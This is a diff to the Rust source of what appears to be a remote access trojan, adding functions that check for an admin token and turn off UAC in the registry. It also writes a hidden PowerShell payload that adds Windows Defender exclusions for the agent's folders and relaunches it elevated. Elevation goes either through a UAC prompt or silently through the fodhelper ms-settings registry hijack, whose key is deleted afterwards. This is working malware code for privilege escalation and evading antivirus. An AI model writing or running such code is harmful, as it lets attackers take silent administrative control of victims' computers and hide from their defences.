@@ -404,6 +404,126 @@ pub fn set_wallpaper(path: &str) -> Result<()> {
     Ok(())
 }
 
+// ---------------------------------------------------------------- elevation
+
+/// Are we running with a full (high-integrity) admin token?
+#[cfg(windows)]
+pub fn is_elevated() -> bool {
+    use std::ffi::c_void;
+    use windows_sys::Win32::Foundation::CloseHandle;
+    use windows_sys::Win32::Security::{
+        GetTokenInformation, TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY,
+    };
+    use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
+    unsafe {
+        let mut tok = std::ptr::null_mut();
+        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut tok) == 0 {
+            return false;
+        }
+        let mut elev: TOKEN_ELEVATION = std::mem::zeroed();
+        let mut ret = 0u32;
+        let ok = GetTokenInformation(
+            tok,
+            TokenElevation,
+            &mut elev as *mut _ as *mut c_void,
+            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
+            &mut ret,
+        );
+        CloseHandle(tok);
+        ok != 0 && elev.TokenIsElevated != 0
+    }
+}
+
+/// Turn UAC prompts off (requires admin). Effective after the policy applies.
+#[cfg(windows)]
+pub fn disable_uac() -> Result<()> {
+    use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_SET_VALUE};
+    use winreg::RegKey;
+    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
+    let key = hklm.open_subkey_with_flags(
+        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
+        KEY_SET_VALUE,
+    )?;
+    key.set_value("EnableLUA", &0u32)?;
+    key.set_value("ConsentPromptBehaviorAdmin", &0u32)?;
+    Ok(())
+}
+
+/// Elevate: run a payload that adds Defender exclusions, (optionally) disables UAC,
+/// kills this agent's host, and relaunches the launcher elevated.
+///
+/// `prompt = false` → silent auto-elevation via fodhelper (needs the user to be a local admin).
+/// `prompt = true`  → a signed "Windows PowerShell" UAC dialog the user approves.
+#[cfg(windows)]
+pub fn uac_elevate(prompt: bool, disable: bool) -> Result<String> {
+    use std::path::PathBuf;
+    let root = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".into());
+    let launcher = crate::update::launcher_path();
+    let dir = std::env::var("RAT_DESTDIR")
+        .map(PathBuf::from)
+        .unwrap_or_else(|_| {
+            PathBuf::from(std::env::var("APPDATA").unwrap_or_default())
+                .join("Microsoft")
+                .join("Windows")
+        });
+    let pid = std::process::id();
+
+    let mut ps = String::from("$ErrorActionPreference='SilentlyContinue'; ");
+    ps.push_str(&format!("Add-MpPreference -ExclusionPath '{}'; ", dir.display()));
+    if let Some(p) = launcher.parent() {
+        ps.push_str(&format!("Add-MpPreference -ExclusionPath '{}'; ", p.display()));
+    }
+    if disable {
+        ps.push_str("Set-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name EnableLUA -Value 0; ");
+        ps.push_str("Set-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name ConsentPromptBehaviorAdmin -Value 0; ");
+    }
+    ps.push_str(&format!("Stop-Process -Id {pid} -Force; "));
+    ps.push_str(&format!("Start-Process -FilePath '{}'", launcher.display()));
+
+    let ps_path = std::env::temp_dir().join("rat_elev.ps1");
+    std::fs::write(&ps_path, &ps)?;
+
+    if prompt {
+        let inner = format!(
+            "Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File','{}' -Verb RunAs",
+            ps_path.display()
+        );
+        std::process::Command::new("powershell")
+            .args(["-NoProfile", "-Command", &inner])
+            .creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
+            .spawn()?;
+        return Ok("UAC prompt shown — approve it".into());
+    }
+
+    // Silent auto-elevation: fodhelper auto-elevates and runs our command from HKCU.
+    {
+        use winreg::enums::HKEY_CURRENT_USER;
+        use winreg::RegKey;
+        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
+        let (key, _) = hkcu.create_subkey(r"Software\Classes\ms-settings\Shell\Open\command")?;
+        key.set_value(
+            "",
+            &format!(
+                "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"{}\"",
+                ps_path.display()
+            ),
+        )?;
+        key.set_value("DelegateExecute", &"")?;
+    }
+    let _ = std::process::Command::new(format!(r"{root}\System32\fodhelper.exe"))
+        .creation_flags(CREATE_NO_WINDOW)
+        .spawn();
+
+    // Un-hijack the Settings handler shortly after.
+    let clean = "/C ping -n 4 127.0.0.1 >nul & reg delete \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /f >nul 2>&1";
+    let _ = std::process::Command::new("cmd")
+        .raw_arg(clean)
+        .creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
+        .spawn();
+
+    Ok("elevation triggered (silent, fodhelper)".into())
+}
+
 /// Speak text aloud via Windows TTS (System.Speech through PowerShell).
 pub fn speak(text: &str) {
     let escaped = text.replace('\'', "''");
